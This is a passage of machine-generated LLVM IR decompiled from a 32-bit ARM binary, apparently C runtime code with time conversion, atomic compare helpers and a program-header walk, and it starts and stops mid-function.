  %v0_158b8 = load i32, i32* @r6, align 4
  %v1_158b8 = inttoptr i32 %v0_158b8 to i32*
  %v2_158b8 = load i32, i32* %v1_158b8, align 4
  store i32 %v2_158b8, i32* %r4.global-to-local, align 4
  %v1_158bc = load i32, i32* @r8, align 4
  %v9_158bc = icmp eq i32 %v2_158b8, %v1_158bc
  %v0_158c4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_158c4, i32* %r2.global-to-local, align 4
  br i1 %v9_158bc, label %dec_label_pc_15888, label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158b8
  %v0_158d4 = load i32, i32* @r5, align 4
  %v2_158d4 = icmp eq i32 %v0_158d4, 0
  store i1 %v2_158d4, i1* @cpsr_z, align 1
  br i1 %v2_158d4, label %dec_label_pc_158f0, label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158d4
  store i32 %v3_15818, i32* @r4, align 4
  store i32 %v12_15818, i32* %r7.global-to-local, align 4
  store i32 %v15_15818, i32* @r8, align 4
  store i32 %v18_15818, i32* %sl.global-to-local, align 4
  store i32 %v21_15818, i32* @lr, align 4
  %v2_158ec = inttoptr i32 %v0_158d4 to i32*
  %v3_158ec = call i32 @function_157e4(i32* %v2_158ec, i32 -1)
  br label %dec_label_pc_158f0

dec_label_pc_158f0:                               ; preds = %dec_label_pc_15840, %dec_label_pc_158d4, %dec_label_pc_158dc
  %v1_158f8 = phi i32 [ 240, %dec_label_pc_158d4 ], [ %v3_158ec, %dec_label_pc_158dc ], [ %v1_158f8828, %dec_label_pc_15840 ]
  store i32 %v3_15818, i32* @r4, align 4
  store i32 %v6_15818, i32* @r5, align 4
  store i32 %v9_15818, i32* @r6, align 4
  store i32 %v12_15818, i32* @r7, align 4
  store i32 %v15_15818, i32* @r8, align 4
  store i32 %v18_15818, i32* @sl, align 4
  store i32 %v21_15818, i32* @lr, align 4
  ret i32 %v1_158f8

; uselistorder directives
  uselistorder i32 %v0_158c4, { 1, 0 }
  uselistorder i32 %v2_158b8, { 1, 2, 0 }
  uselistorder i32 %v0_158b8, { 1, 0 }
  uselistorder i32 %v0_15858.pre, { 0, 2, 1 }
  uselistorder i32 %v21_15818, { 1, 0 }
  uselistorder i32 %v18_15818, { 1, 0 }
  uselistorder i32 %v15_15818, { 1, 0 }
  uselistorder i32 %v12_15818, { 1, 0 }
  uselistorder i32 %v3_15818, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 4, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_157c0, { 1, 0 }
  uselistorder label %dec_label_pc_158f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158b4, { 1, 0 }
  uselistorder label %dec_label_pc_15878, { 1, 0 }
  uselistorder label %dec_label_pc_15858, { 1, 0 }
}

define i32 @function_158fc() local_unnamed_addr {
dec_label_pc_158fc:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_158fc = load i32, i32* @r0, align 4
  %v0_15900 = load i32, i32* @r7, align 4
  store i32 %v0_15900, i32* %stack_var_-4, align 4
  %v0_15904 = load i32, i32* @r2, align 4
  store i32 %v0_15904, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_158fc, 2
  br i1 %tmp, label %.thread7, label %dec_label_pc_15910

.thread7:                                         ; preds = %dec_label_pc_158fc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1594c

dec_label_pc_15910:                               ; preds = %dec_label_pc_158fc
  %v1_1591c = sub i32 0, %v0_158fc
  store i32 %v1_1591c, i32* %r0.global-to-local, align 4
  %v1_15920 = add i32 %v0_158fc, 1
  %v2_15920 = icmp ult i32 %v1_1591c, 2
  br i1 %v2_15920, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_15910
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_15910, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_15920, %dec_label_pc_15910 ]
  %v0_15930.pr = phi i32 [ 0, %bb ], [ %v1_15920, %dec_label_pc_15910 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_15928 = icmp eq i32 %v0_15904, 0
  br i1 %v2_15928, label %.thread, label %bb12

.thread:                                          ; preds = %bb11
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1594c

bb12:                                             ; preds = %bb11
  %v2_15930 = icmp eq i32 %v0_15930.pr, 0
  br i1 %v2_15930, label %dec_label_pc_1594c, label %dec_label_pc_15938

dec_label_pc_15938:                               ; preds = %bb12
  %v1_15938 = inttoptr i32 %v0_15904 to i32*
  %v2_15938 = load i32, i32* %v1_15938, align 4
  %v1_1593c = add i32 %v0_15904, 4
  %v2_1593c = inttoptr i32 %v1_1593c to i32*
  %v3_1593c = load i32, i32* %v2_1593c, align 4
  %tmp13 = bitcast i32 %v2_15938 to float
  %tmp14 = call float @fabsf(float %tmp13)
  %v1_15940 = bitcast float %tmp14 to i32
  %v1_15944 = and i32 %v3_1593c, -4
  store i32 %v1_15944, i32* %r3.global-to-local, align 4
  store i32 %v1_15940, i32* %v1_15938, align 4
  %v5_15948 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15948, i32* %v2_1593c, align 4
  %v2_1594c.pre = load i32, i32* %stack_var_-4, align 4
  %v1_15950.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1594c

dec_label_pc_1594c:                               ; preds = %.thread7, %.thread, %bb12, %dec_label_pc_15938
  %v1_15950 = phi i32 [ %v1_1591c, %.thread ], [ %v1_1591c, %bb12 ], [ %v1_15950.pre, %dec_label_pc_15938 ], [ 22, %.thread7 ]
  %v2_1594c = phi i32 [ %v0_15900, %.thread ], [ %v0_15900, %bb12 ], [ %v2_1594c.pre, %dec_label_pc_15938 ], [ %v0_15900, %.thread7 ]
  store i32 %v2_1594c, i32* @r7, align 4
  ret i32 %v1_15950

; uselistorder directives
  uselistorder i32 %v0_158fc, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1594c, { 3, 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_15954(i32 %arg1) local_unnamed_addr {
dec_label_pc_15954:
  %stack_var_-16 = alloca i32, align 4
  %v2_15958 = ptrtoint i32* %stack_var_-16 to i32
  %v2_15964 = call i32 @function_159c4(i32 2, i32 %v2_15958)
  %v2_15968 = icmp eq i32 %v2_15964, 0
  br i1 %v2_15968, label %dec_label_pc_15970, label %dec_label_pc_159b0

dec_label_pc_15970:                               ; preds = %dec_label_pc_15954
  %v2_15970 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15970, i32* @r4, align 4
  %v10_1597c = icmp sgt i32 %v2_15970, 2147
  br i1 %v10_1597c, label %dec_label_pc_159b0, label %dec_label_pc_15980

dec_label_pc_15980:                               ; preds = %dec_label_pc_15970
  store i32 1000, i32* @r1, align 4
  %v0_15988 = call i32 @function_12a34()
  %v0_15994 = load i32, i32* @r4, align 4
  %v2_15994 = mul i32 %v0_15994, 1000000
  %v2_1599c = sub i32 2147483647, %v2_15994
  %v7_159a4 = icmp sgt i32 %v0_15988, %v2_1599c
  %v10_159a44 = add i32 %v2_15994, %v0_15988
  %.v10_159a44 = select i1 %v7_159a4, i32 -1, i32 %v10_159a44
  br label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_15980, %dec_label_pc_15970, %dec_label_pc_15954
  %storemerge = phi i32 [ -1, %dec_label_pc_15954 ], [ -1, %dec_label_pc_15970 ], [ %.v10_159a44, %dec_label_pc_15980 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 2147483647, { 4, 6, 0, 1, 2, 3, 5 }
}

define i32 @function_159bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_159bc:
  %v0_159bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_159bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_159bc
  %v3_159bc = udiv i32 %arg2, 65536
  %v4_159bc = mul i32 %arg2, 65536
  %v5_159bc = or i32 %v3_159bc, %v4_159bc
  %v8_159bc = and i32 %v5_159bc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_159bc, %bb
  %v6_159c0 = phi i32 [ %arg1, %dec_label_pc_159bc ], [ %v8_159bc, %bb ]
  ret i32 %v6_159c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_159c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_159c4:
  %r4.global-to-local = alloca i32, align 4
  %v6_159c4 = load i32, i32* @r5, align 4
  %v9_159c4 = load i32, i32* @r6, align 4
  %v12_159c4 = load i32, i32* @r7, align 4
  %v2_159cc = load i32, i32* @global_var_227c8.611, align 4
  %v2_159d0 = icmp eq i32 %v2_159cc, 0
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_159d0, label %dec_label_pc_159e4, label %dec_label_pc_15a24

dec_label_pc_159e4:                               ; preds = %dec_label_pc_159c4
  %v4_159ec = call i32 @function_168b8(i32 ptrtoint ([10 x i8]* @global_var_19fb8.613 to i32), i32 ptrtoint ([21 x i8]* @global_var_19fc4.615 to i32))
  %v2_159f4 = icmp eq i32 %v4_159ec, 0
  store i1 %v2_159f4, i1* @cpsr_z, align 1
  %storemerge = select i1 %v2_159f4, i32 ptrtoint (i32* @global_var_15a58.617 to i32), i32 %v4_159ec
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v4_15a0c13 = call i32 @function_15cec(i32 0, i32 %storemerge, i32* nonnull @global_var_227c8.611)
  %v2_15a1015 = icmp eq i32 %v4_15a0c13, 0
  %v2_15a2c.pre.pre16 = load i32, i32* @global_var_227c8.611, align 4
  br i1 %v2_15a1015, label %dec_label_pc_15a24.loopexit, label %dec_label_pc_15a18

dec_label_pc_15a18:                               ; preds = %dec_label_pc_159e4, %dec_label_pc_15a18._crit_edge
  %v2_15a2c.pre.pre17 = phi i32 [ %v2_15a2c.pre.pre, %dec_label_pc_15a18._crit_edge ], [ %v2_15a2c.pre.pre16, %dec_label_pc_159e4 ]
  %v2_15a1c = icmp eq i32 %v2_15a2c.pre.pre17, 0
  store i1 %v2_15a1c, i1* @cpsr_z, align 1
  br i1 %v2_15a1c, label %dec_label_pc_15a18._crit_edge, label %dec_label_pc_15a24.loopexit

dec_label_pc_15a18._crit_edge:                    ; preds = %dec_label_pc_15a18
  %v0_15a04.pre = load i32, i32* %r4.global-to-local, align 4
  %v4_15a0c = call i32 @function_15cec(i32 0, i32 %v0_15a04.pre, i32* nonnull @global_var_227c8.611)
  %v2_15a10 = icmp eq i32 %v4_15a0c, 0
  %v2_15a2c.pre.pre = load i32, i32* @global_var_227c8.611, align 4
  br i1 %v2_15a10, label %dec_label_pc_15a24.loopexit, label %dec_label_pc_15a18

dec_label_pc_15a24.loopexit:                      ; preds = %dec_label_pc_15a18, %dec_label_pc_15a18._crit_edge, %dec_label_pc_159e4
  %v2_15a2c.pre.pre.lcssa = phi i32 [ %v2_15a2c.pre.pre16, %dec_label_pc_159e4 ], [ %v2_15a2c.pre.pre, %dec_label_pc_15a18._crit_edge ], [ %v2_15a2c.pre.pre17, %dec_label_pc_15a18 ]
  %v0_15a28.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a24.loopexit, %dec_label_pc_159c4
  %v2_15a2c = phi i32 [ %v2_15a2c.pre.pre.lcssa, %dec_label_pc_15a24.loopexit ], [ %v2_159cc, %dec_label_pc_159c4 ]
  %v0_15a28 = phi i32 [ %v0_15a28.pre, %dec_label_pc_15a24.loopexit ], [ %arg1, %dec_label_pc_159c4 ]
  call void @__pseudo_branch(i32 %v2_15a2c)
  store i32 %v6_159c4, i32* @r5, align 4
  store i32 %v9_159c4, i32* @r6, align 4
  store i32 %v12_159c4, i32* @r7, align 4
  ret i32 %v0_15a28

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* @global_var_227c8.611, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_15a24.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15a18, { 1, 0 }
}

define i32 @function_15a58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15a58:
  %v2_15a6c = icmp eq i32 %arg1, 0
  br i1 %v2_15a6c, label %dec_label_pc_15ac4, label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a58
  %v4_15a78 = icmp eq i32 %arg1, -38
  br i1 %v4_15a78, label %bb, label %dec_label_pc_15ab4

bb:                                               ; preds = %dec_label_pc_15a74
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15a74, %bb
  %storemerge = phi i32 [ -22, %bb ], [ %arg1, %dec_label_pc_15a74 ]
  %v0_15ab4 = call i32 @function_12ecc()
  %v1_15ab8 = sub i32 0, %storemerge
  %v2_15abc = inttoptr i32 %v0_15ab4 to i32*
  store i32 %v1_15ab8, i32* %v2_15abc, align 4
  br label %dec_label_pc_15ac4

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15a58, %dec_label_pc_15ab4
  %v1_15ac8 = phi i32 [ 0, %dec_label_pc_15a58 ], [ -1, %dec_label_pc_15ab4 ]
  ret i32 %v1_15ac8

; uselistorder directives
  uselistorder i32 -22, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ac4, { 1, 0 }
  uselistorder label %dec_label_pc_15ab4, { 1, 0 }
}

define i32 @function_15ad0(i32* %arg1) local_unnamed_addr {
dec_label_pc_15ad0:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15ad0 = load i32, i32* @r4, align 4
  %v2_15ad4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15ae4 = call i32 @function_159c4(i32 0, i32 %v2_15ad4)
  %v0_15ae8 = load i32, i32* @r4, align 4
  %v2_15ae8 = icmp eq i32 %v0_15ae8, 0
  br i1 %v2_15ae8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15ad0
  %v3_15aec = load i32, i32* %stack_var_-16, align 4
  %v3_15af0 = inttoptr i32 %v0_15ae8 to i32*
  store i32 %v3_15aec, i32* %v3_15af0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15ad0, %bb
  %v2_15af4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_15ad0, i32* @r4, align 4
  ret i32 %v2_15af4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_159c4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15b04(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b04:
  %v0_15b10 = call i32 @function_13178()
  ret i32 %v0_15b10
}

define i32 @function_15b1c() local_unnamed_addr {
dec_label_pc_15b1c:
  %v1_15b1c = load i32, i32* @r0, align 4
  ret i32 %v1_15b1c
}

define i32 @function_15b20(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b20:
  %v0_15b20 = load i32, i32* @lr, align 4
  store i32 88884, i32* @lr, align 4
  %v1_15b30 = call i32 @function_15b1c()
  store i32 %v1_15b30, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_15b54 = call i32 @function_15754(i32 6, i32 %v1_15b30, i32 0)
  %v7_15b58 = icmp eq i32 %v3_15b54, -4
  br i1 %v7_15b58, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_15b20
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15b20, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v3_15b54, %dec_label_pc_15b20 ]
  store i32 %storemerge, i32* @r0, align 4
  %v0_15b60 = call i32 @function_13178()
  store i32 %v0_15b20, i32* @lr, align 4
  ret i32 %v0_15b60

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15b74(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b74:
  %v1_15b84 = load i32, i32* @r0, align 4
  ret i32 %v1_15b84
}

define i32 @function_15b88() local_unnamed_addr {
dec_label_pc_15b88:
  %v1_15b98 = load i32, i32* @r0, align 4
  ret i32 %v1_15b98
}

define i32 @function_15b9c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15b9c:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_15bc8 = call i32 @function_15754(i32 3, i32 %arg1, i32 %arg2)
  store i32 %v3_15bc8, i32* @r0, align 4
  %v0_15bcc = call i32 @function_13178()
  ret i32 %v0_15bcc

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_15bdc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15bdc:
  %v0_15be8 = call i32 @function_13178()
  ret i32 %v0_15be8
}

define i32 @function_15bf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15bf4:
  %v0_15c00 = call i32 @function_13178()
  ret i32 %v0_15c00
}

define i32 @function_15c0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c0c:
  %stack_var_-16 = alloca i32, align 4
  %v2_15c10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_15c28 = call i32 @function_16f60(i32 %v2_15c10, i32 %v2_15c10)
  %v2_15c2c = icmp eq i32 %v2_15c28, 0
  br i1 %v2_15c2c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_15c0c
  %v3_15c30 = load i32, i32* %stack_var_-16, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15c0c, %bb
  %v1_15c3c = phi i32 [ 0, %dec_label_pc_15c0c ], [ %v3_15c30, %bb ]
  ret i32 %v1_15c3c

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15c40(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c40:
  %v0_15c4c = call i32 @function_13178()
  ret i32 %v0_15c4c
}

define i32 @function_15c58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15c58:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_15c84 = call i32 @function_15754(i32 4, i32 %arg1, i32 %arg2)
  store i32 %v3_15c84, i32* @r0, align 4
  %v0_15c88 = call i32 @function_13178()
  ret i32 %v0_15c88

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_15c98() local_unnamed_addr {
dec_label_pc_15c98:
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15ca8.623 to i32))
  %v0_15ca4 = load i1, i1* @cpsr_z, align 1
  %v1_15ca4 = load i32, i32* @r0, align 4
  br i1 %v0_15ca4, label %bb, label %dec_label_pc_15c98._crit_edge

bb:                                               ; preds = %dec_label_pc_15c98
  br label %dec_label_pc_15c98._crit_edge

dec_label_pc_15c98._crit_edge:                    ; preds = %dec_label_pc_15c98, %bb
  %v0_15ca8 = load i32, i32* @lr, align 4
  %v1_15ca8 = urem i32 %v0_15ca8, 2
  %v2_15ca8 = icmp eq i32 %v1_15ca8, 0
  store i1 %v2_15ca8, i1* @cpsr_z, align 1
  ret i32 %v1_15ca4

; uselistorder directives
  uselistorder label %dec_label_pc_15c98._crit_edge, { 1, 0 }
}

define i32 @function_15cb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15cb4:
  %v1_15cc8 = call i32 @unknown_ffff0fc0()
  ret i32 %arg1
}

define i32 @function_15cec(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_15cec:
  %v3_15cf0 = load i32, i32* @global_var_22300.626, align 4
  store i32 %v3_15cf0, i32* @ip, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15cfc.627 to i32))
  %v0_15cf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15cf8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_15cec
  %v2_15cf8 = load i32, i32* @r8, align 4
  %v5_15cf8 = mul i32 %v2_15cf8, 4096
  %v6_15cf8 = and i32 %v5_15cf8, %arg1
  store i32 %v6_15cf8, i32* @ip, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_15cec, %bb
  %v2_15d00 = load i32, i32* %arg3, align 4
  %v2_15d04 = sub i32 %arg1, %v2_15d00
  %v9_15d04 = icmp eq i32 %v2_15d00, %arg1
  br i1 %v9_15d04, label %bb2, label %bb3

bb2:                                              ; preds = %bb1
  store i32 %arg2, i32* %arg3, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  ret i32 %v2_15d04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_15d18(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_15d18:
  br label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %bb, %dec_label_pc_15d18
  %v2_15d20 = load i32, i32* %arg2, align 4
  %v2_15d24 = sub i32 %arg1, %v2_15d20
  %v9_15d24 = icmp eq i32 %v2_15d20, %arg1
  br i1 %v9_15d24, label %bb, label %dec_label_pc_15d34

bb:                                               ; preds = %dec_label_pc_15d20
  %v4_15d2c = icmp eq i32 %v2_15d24, 1
  br i1 %v4_15d2c, label %dec_label_pc_15d20, label %dec_label_pc_15d34

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d20, %bb
  ret i32 %v2_15d24

; uselistorder directives
  uselistorder i32 %v2_15d24, { 1, 0 }
  uselistorder label %dec_label_pc_15d34, { 1, 0 }
}

define i32 @function_15d3c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_15d3c:
  br label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %bb, %dec_label_pc_15d3c
  %v2_15d44 = load i32, i32* %arg2, align 4
  %v2_15d48 = sub i32 %arg1, %v2_15d44
  %v9_15d48 = icmp eq i32 %v2_15d44, %arg1
  br i1 %v9_15d48, label %bb, label %dec_label_pc_15d58

bb:                                               ; preds = %dec_label_pc_15d44
  %v4_15d50 = icmp eq i32 %v2_15d48, 1
  br i1 %v4_15d50, label %dec_label_pc_15d44, label %dec_label_pc_15d58

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d44, %bb
  ret i32 %v2_15d48

; uselistorder directives
  uselistorder i32 %v2_15d48, { 1, 0 }
  uselistorder label %dec_label_pc_15d58, { 1, 0 }
}

define i32 @function_15d60() local_unnamed_addr {
dec_label_pc_15d60:
  %v3_15d64 = load i32, i32* @global_var_22304.629, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15d70.630 to i32))
  ret i32 %v3_15d64
}

define i32 @function_15d7c() local_unnamed_addr {
dec_label_pc_15d7c:
  %v2_15d80 = load i32, i32* @global_var_22b14.632, align 4
  %v2_15d84 = icmp eq i32 %v2_15d80, 0
  %v0_15d88 = load i32, i32* @r0, align 4
  store i32 %v0_15d88, i32* @ip, align 4
  br i1 %v2_15d84, label %dec_label_pc_15ddc, label %dec_label_pc_15d98

dec_label_pc_15d98:                               ; preds = %dec_label_pc_15d7c
  %v3_15d98 = load i32, i32* @global_var_22b20.633, align 4
  %v1_15d9c = add i32 %v0_15d88, 8
  %v2_15da4 = sub i32 -220, %v0_15d88
  %v1_15da8 = add i32 %v3_15d98, -1
  %v2_15dac = and i32 %v1_15da8, %v2_15da4
  %v2_15db0 = add i32 %v1_15d9c, %v2_15dac
  store i32 %v2_15db0, i32* @r4, align 4
  %v1_15db4 = add i32 %v2_15db0, 212
  store i32 1, i32* @r3, align 4
  %v2_15dbc = inttoptr i32 %v0_15d88 to i32*
  store i32 1, i32* %v2_15dbc, align 4
  %v1_15dc0 = load i32, i32* @ip, align 4
  %v2_15dc0 = add i32 %v1_15dc0, 4
  %v3_15dc0 = inttoptr i32 %v2_15dc0 to i32*
  store i32 %v1_15db4, i32* %v3_15dc0, align 4
  %v3_15dc4 = load i32, i32* @global_var_22b18.634, align 4
  %v0_15dc8 = load i32, i32* @ip, align 4
  %v1_15dc8 = load i32, i32* @r4, align 4
  %v2_15dc8 = add i32 %v1_15dc8, 208
  %v3_15dc8 = inttoptr i32 %v2_15dc8 to i32*
  store i32 %v0_15dc8, i32* %v3_15dc8, align 4
  %v0_15dcc = load i32, i32* @ip, align 4
  %v1_15dcc = load i32, i32* @r4, align 4
  %v2_15dcc = add i32 %v1_15dcc, 4
  %v3_15dcc = inttoptr i32 %v2_15dcc to i32*
  store i32 %v0_15dcc, i32* %v3_15dcc, align 4
  %v2_15dd0 = load i32, i32* @global_var_22b14.632, align 4
  %v3_15dd4 = inttoptr i32 %v1_15db4 to i16*
  %v4_15dd4 = call i32 @function_150f0(i16* %v3_15dd4, i32 %v2_15dd0, i32 %v3_15dc4)
  %v0_15dd8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15d7c, %dec_label_pc_15d98
  %v1_15de0 = phi i32 [ %v0_15d88, %dec_label_pc_15d7c ], [ %v0_15dd8, %dec_label_pc_15d98 ]
  ret i32 %v1_15de0

; uselistorder directives
  uselistorder i32 %v0_15d88, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15ddc, { 1, 0 }
}

define i32 @function_15de8(i32 %arg1) local_unnamed_addr {
dec_label_pc_15de8:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v6_15de8 = load i32, i32* @r5, align 4
  %v1_15dec = add i32 %arg1, 12
  %v2_15dec = inttoptr i32 %v1_15dec to i32*
  %v3_15dec = load i32, i32* %v2_15dec, align 4
  %v1_15df4 = add i32 %arg1, 20
  %v2_15df4 = inttoptr i32 %v1_15df4 to i32*
  %v3_15df4 = load i32, i32* %v2_15df4, align 4
  store i32 %v3_15df4, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  %v2_15e2c5 = icmp eq i32 %v3_15df4, 0
  br i1 %v2_15e2c5, label %dec_label_pc_15e34.thread, label %dec_label_pc_15e04.lr.ph

dec_label_pc_15e34.thread:                        ; preds = %dec_label_pc_15de8
  br label %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge

dec_label_pc_15e04.lr.ph:                         ; preds = %dec_label_pc_15de8
  %v1_15e20 = add i32 %arg1, 16
  %v2_15e20 = inttoptr i32 %v1_15e20 to i32*
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15e04.lr.ph, %dec_label_pc_15e2c
  %v0_15e5816 = phi i32 [ 0, %dec_label_pc_15e04.lr.ph ], [ %v0_15e5814, %dec_label_pc_15e2c ]
  %v0_15e3412 = phi i32 [ 0, %dec_label_pc_15e04.lr.ph ], [ %v0_15e3411, %dec_label_pc_15e2c ]
  %v0_15e24 = phi i32 [ %v3_15df4, %dec_label_pc_15e04.lr.ph ], [ %v1_15e24, %dec_label_pc_15e2c ]
  %v0_15e28 = phi i32 [ %v3_15dec, %dec_label_pc_15e04.lr.ph ], [ %v2_15e28, %dec_label_pc_15e2c ]
  %v1_15e04 = inttoptr i32 %v0_15e28 to i32*
  %v2_15e04 = load i32, i32* %v1_15e04, align 4
  store i32 %v2_15e04, i32* %r3.global-to-local, align 4
  switch i32 %v2_15e04, label %dec_label_pc_15e2c [
    i32 6, label %.thread
    i32 7, label %bb
  ]

.thread:                                          ; preds = %dec_label_pc_15e04
  %v2_15e0c = add i32 %v0_15e28, 8
  %v3_15e0c = inttoptr i32 %v2_15e0c to i32*
  %v4_15e0c = load i32, i32* %v3_15e0c, align 4
  store i32 %v4_15e0c, i32* %r3.global-to-local, align 4
  %v3_15e10 = sub i32 %v3_15dec, %v4_15e0c
  store i32 %v3_15e10, i32* @r4, align 4
  br label %dec_label_pc_15e2c

bb:                                               ; preds = %dec_label_pc_15e04
  br label %dec_label_pc_15e2c

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e04, %.thread, %bb
  %v0_15e5814 = phi i32 [ %v3_15e10, %.thread ], [ %v0_15e5816, %bb ], [ %v0_15e5816, %dec_label_pc_15e04 ]
  %v0_15e3411 = phi i32 [ %v0_15e3412, %.thread ], [ %v0_15e28, %bb ], [ %v0_15e3412, %dec_label_pc_15e04 ]
  %v3_15e20 = load i32, i32* %v2_15e20, align 4
  store i32 %v3_15e20, i32* %r3.global-to-local, align 4
  %v1_15e24 = add i32 %v0_15e24, -1
  store i32 %v1_15e24, i32* @lr, align 4
  %v2_15e28 = add i32 %v3_15e20, %v0_15e28
  %v2_15e2c = icmp eq i32 %v1_15e24, 0
  br i1 %v2_15e2c, label %dec_label_pc_15e34, label %dec_label_pc_15e04

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e2c
  %v2_15e34 = icmp eq i32 %v0_15e3411, 0
